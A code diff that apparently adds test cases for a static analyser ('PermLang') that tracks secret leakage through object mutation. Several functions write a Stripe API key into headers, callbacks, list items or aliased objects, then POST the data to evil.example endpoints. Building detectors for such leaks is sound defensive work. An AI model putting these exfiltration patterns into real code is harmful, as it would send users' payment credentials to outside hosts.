@@ -197,11 +197,135 @@ export async function checkoutOrder(order: Order) {
 }
 
 /** A logger that takes a string can't hand anything back. */
-function logCharge(message: string): void {
-  void fetch("https://api.stripe.com/v1/log", { method: "POST", headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` }, body: message });
+function logCharge(message: string | number): void {
+  void fetch("https://api.stripe.com/v1/log", { method: "POST", headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` }, body: String(message) });
 }
 
 export async function logged() {
   logCharge("charged");
   await fetch("https://analytics.example/logged");
+}
+
+// --- More ways an object comes back.
+
+function stamp(target: { headers: Record<string, string>; key: string }): void {
+  target.headers.authorization = target.key;
+}
+
+/** Passes the headers on, written as `{ headers }`, to a helper that writes the key into them. */
+function attach(headers: Record<string, string>): void {
+  stamp({ headers, key: process.env.STRIPE_KEY! });
+}
+
+export async function viaShorthand() {
+  const headers: Record<string, string> = {};
+  attach(headers);
+  await fetch("https://evil.example/shorthand", { method: "POST", headers });
+}
+
+/** Calls what it's given, typed any. */
+function notify(sink: any): void {
+  sink(process.env.STRIPE_KEY);
+}
+
+export async function viaAnyCallee(sink: unknown) {
+  notify(sink);
+  await fetch("https://evil.example/any", { method: "POST", body: String(sink) });
+}
+
+/** Calls a method of a member typed any. */
+function record(log: { meta: any }): void {
+  log.meta.write(process.env.STRIPE_KEY);
+}
+
+export async function viaAnyMember(log: { meta: any }) {
+  record(log);
+  await fetch("https://evil.example/meta", { method: "POST", body: String(log.meta) });
+}
+
+function tagLine(line: { note?: string }) {
+  line.note = process.env.STRIPE_KEY;
+}
+
+/** Writes the key into a list's elements through a function of its own... */
+function tagAll(order: Order): void {
+  order.lines.forEach(tagLine);
+}
+
+export async function viaFunctionReference(order: Order) {
+  tagAll(order);
+  await fetch("https://evil.example/reference", { method: "POST", body: JSON.stringify(order) });
+}
+
+/** ...or a function expression. */
+function tagEach(order: Order): void {
+  order.lines.forEach(function (line) {
+    line.note = process.env.STRIPE_KEY;
+  });
+}
+
+export async function viaFunctionExpression(order: Order) {
+  tagEach(order);
+  await fetch("https://evil.example/expression", { method: "POST", body: JSON.stringify(order) });
+}
+
+/** Keeps the object under another name, where it could be written: `order ?? fallback`. */
+function pickAndTag(order: Order | null, fallback: Order): void {
+  const target = order ?? fallback;
+  target.lines.push({ sku: "key", note: process.env.STRIPE_KEY });
+}
+
+export async function viaAlias(order: Order) {
+  pickAndTag(order, order);
+  await fetch("https://evil.example/alias", { method: "POST", body: JSON.stringify(order) });
+}
+
+/** Callbacks nested deeper than PermLang looks: it assumes the innermost one writes. */
+function deepRead(levels: { note?: string }[][][][][][]): void {
+  levels.forEach((a) => a.forEach((b) => b.forEach((c) => c.forEach((d) => d.forEach((e) => e.forEach((f) => f.note === process.env.STRIPE_KEY))))));
+}
+
+export async function viaDeepCallbacks(levels: { note?: string }[][][][][][]) {
+  deepRead(levels);
+  await fetch("https://evil.example/deep", { method: "POST", body: JSON.stringify(levels) });
+}
+
+// --- Look-alikes that only read what they're given.
+
+interface TaggedOrder extends Order {
+  tags: string[];
+}
+
+/** Tests what it's given in every way PermLang knows, and replaces only its own copy. */
+async function chargeIfReady(order: TaggedOrder | null, previous: TaggedOrder | undefined, at: Date, counts: { tries: number; last?: string }): Promise<void> {
+  if (order) counts.tries++;
+  while (previous && previous.total) previous = undefined;
+  const ready = order ? order.total > 0 : false;
+  if (!order || order === previous || !("id" in order) || typeof order !== "object" || !(order instanceof Object)) return;
+  delete counts.last;
+  do {
+    await fetch("https://api.stripe.com/v1/charges", {
+      method: "POST",
+      headers: { authorization: `Bearer ${process.env.STRIPE_KEY}` },
+      body: `${ready}:${+at}:${order.tags.includes("vip")}:${order.tags.map(String).join(",")}:${order.lines.some((line) => line.sku === "x")}`,
+    });
+  } while (ready && order);
+  if (counts.tries > 3 || (previous ?? order) === order) void order;
+}
+
+export async function checkoutIfReady(order: TaggedOrder) {
+  await chargeIfReady(order, undefined, new Date(), { tries: 0 });
+  await fetch("https://analytics.example/ready");
+}
+
+/** Stores the object by assigning it to a variable, where it could be written. */
+function keepAndTag(order: Order): void {
+  let kept: Order | undefined;
+  kept = order;
+  kept.lines.push({ sku: "key", note: process.env.STRIPE_KEY });
+}
+
+export async function viaAssignment(order: Order) {
+  keepAndTag(order);
+  await fetch("https://evil.example/assigned", { method: "POST", body: JSON.stringify(order) });
 }
